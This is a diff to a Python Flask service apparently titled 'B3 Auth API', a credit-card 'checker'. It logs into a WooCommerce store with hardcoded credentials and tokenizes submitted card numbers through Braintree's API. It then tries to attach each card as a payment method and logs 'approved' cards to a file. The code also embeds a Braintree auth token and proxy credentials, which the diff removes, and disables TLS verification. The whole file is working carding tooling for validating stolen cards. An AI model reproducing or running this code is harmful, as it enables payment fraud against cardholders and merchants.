@@ -13,37 +13,32 @@ import urllib3
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Proxy configuration (Preserved from original)
-proxies = {
-    'http': 'http://25chilna:password@209.174.185.196:6226',
-    'https': 'http://25chilna:password@209.174.185.196:6226'
-}
-
 # Initialize Flask app
 app = Flask(__name__)
 
 class BraintreeLoginChecker:
-    def __init__(self, proxies=None):
+    def __init__(self):
         self.session = requests.Session()
-        self.proxies = proxies
+        # No proxy used
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
-        # Known auth token from the new script
+        # Known auth token
         self.known_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjgwNTE4NDYsImp0aSI6IjYyYjhjMjNlLTE3ZWUtNGRjNS05ODM4LTI0MjM0MDgwZDBiNCIsInN1YiI6IjNteWQ5cXJxemZqa3c5NDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNteWQ5cXJxemZqa3c5NDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.IDFUkXr3E9_qrYgMhfw8Zz8ZUw7kMMxHAqIlgJFD1Zk0aGphMLZyIuvv3hvSKa5nvA2T26EZWwREZEVpCT-6yw"
     
     def login(self, domain, username, password):
         login_url = f"{domain}/my-account/"
         
         try:
-            response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
+            # No proxies parameter
+            response = self.session.get(login_url, headers=self.headers, verify=False, timeout=15)
         except Exception as e:
             return False, f"Connection failed: {str(e)}"
 
         if response.status_code != 200:
             return False, f"Failed to get login page (Status: {response.status_code})"
         
-        # Check if text exists to avoid NoneType errors
+        # Force string to avoid NoneType issues
         response_text = response.text if response.text else ""
         
         soup = BeautifulSoup(response_text, 'html.parser')
@@ -76,18 +71,16 @@ class BraintreeLoginChecker:
         })
         
         try:
-            login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False, timeout=15)
+            # No proxies parameter
+            login_response = self.session.post(login_url, headers=login_headers, data=login_data, verify=False, timeout=15)
         except Exception as e:
             return False, f"Post login failed: {str(e)}"
             
-        # Safely check response text
         login_text = login_response.text if login_response.text else ""
 
-        # Check for success indicators
         if "Log out" in login_text or "My Account" in login_text or "Dashboard" in login_text:
             return True, self.session
         else:
-            # Return a snippet of the response for debugging if login fails
             return False, "Login failed - Invalid credentials or redirect loop"
     
     def get_auth_tokens(self, domain, use_known_token=True):
@@ -97,7 +90,8 @@ class BraintreeLoginChecker:
         headers['Referer'] = f"{domain}/my-account/"
         
         try:
-            response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False, timeout=15)
+            # No proxies parameter
+            response = self.session.get(payment_url, headers=headers, verify=False, timeout=15)
         except Exception as e:
             return None, None, f"Connection error fetching payment page: {str(e)}"
         
@@ -126,6 +120,10 @@ class BraintreeLoginChecker:
             ]
             
             for pattern in patterns:
+                # Ensure response_text is valid for regex
+                if not isinstance(response_text, str):
+                    continue
+                    
                 matches = re.findall(pattern, response_text, re.IGNORECASE)
                 if matches:
                     for match in matches:
@@ -193,11 +191,11 @@ class BraintreeLoginChecker:
         }
         
         try:
+            # No proxies parameter
             response = requests.post(
                 'https://payments.braintree-api.com/graphql',
                 headers=token_headers,
                 json=json_data,
-                proxies=self.proxies,
                 verify=False,
                 timeout=15
             )
@@ -207,6 +205,10 @@ class BraintreeLoginChecker:
         if response.status_code == 200:
             try:
                 token_data = response.json()
+                # Check if token_data is None to avoid "not iterable" error
+                if token_data is None:
+                    return None
+                    
                 if 'data' in token_data and 'tokenizeCreditCard' in token_data['data']:
                     token = token_data['data']['tokenizeCreditCard']['token']
                     return token
@@ -240,7 +242,8 @@ class BraintreeLoginChecker:
             'woocommerce_add_payment_method': '1',
         }
         
-        response = self.session.post(payment_url, headers=submit_headers, data=data, proxies=self.proxies, verify=False, timeout=20)
+        # No proxies parameter
+        response = self.session.post(payment_url, headers=submit_headers, data=data, verify=False, timeout=20)
         
         return response
 
@@ -254,7 +257,7 @@ def check_card(cc_line):
     password = "Xcracker@911"
     
     try:
-        checker = BraintreeLoginChecker(proxies=proxies)
+        checker = BraintreeLoginChecker()
         
         # 1. Login
         success, result = checker.login(domain, username, password)
@@ -324,7 +327,7 @@ def check_card(cc_line):
 
         elapsed_time = time.time() - start_time
 
-        # Save approved cards to approved.txt (Preserved from original)
+        # Save approved cards to approved.txt
         if is_approved:
             try:
                 with open('approved.txt', 'a', encoding='utf-8') as approved_file:
@@ -369,7 +372,7 @@ def check_credit_card(card):
 def index():
     """Home endpoint with instructions"""
     return """
-    <h1>B3 Auth API (New Logic)</h1>
+    <h1>B3 Auth API (No Proxy)</h1>
     <p>Use the endpoint: /gate=b3/cc={card}</p>
     <p>Format: CC_NUMBER|MM|YY|CVC</p>
     <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
